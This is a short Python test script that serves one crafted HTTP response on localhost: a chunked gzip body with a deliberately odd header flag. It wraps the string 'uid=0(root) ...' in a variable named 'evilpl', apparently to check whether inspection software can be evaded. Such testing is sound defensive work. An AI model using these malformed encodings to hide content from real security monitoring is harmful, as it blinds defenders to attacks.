#! /usr/bin/env python

# @author: Philippe Antoine

import sys
import binascii
from threading import Thread
import time
import socket
import zlib
import gzip

print(binascii.hexlify(gzip.compress(b"uid=0(root) ...")))
print(gzip.decompress(binascii.unhexlify("1f8b080200000000000000002bcd4cb135d028cacf2fd154d0d3d303006e3f9d430f000000")))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("127.0.0.1", 8002))
s.listen(1)
conn, addr = s.accept()
data = conn.recv(1024)
evilpl = binascii.unhexlify("00") + zlib.compress(b"uid=0(root) ...", 9)[2:-4] + binascii.unhexlify("6e3f9d430f000000")
a = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Encoding: gzip\r\nTransfer-Encoding: chunked\r\n\r\nb\r\n"
#1f8b080200000000000000002bcd4cb135d028cacf2fd154d0d3d303006e3f9d430f000000
#
a = a + binascii.unhexlify("1f8b080200000000000000")+b"\r\n"
a = a + b"%x\r\n" % len(evilpl) + evilpl + b"\r\n0\r\n\r\n"
conn.send(a)

data = conn.recv(1024)
conn.close()
s.close()
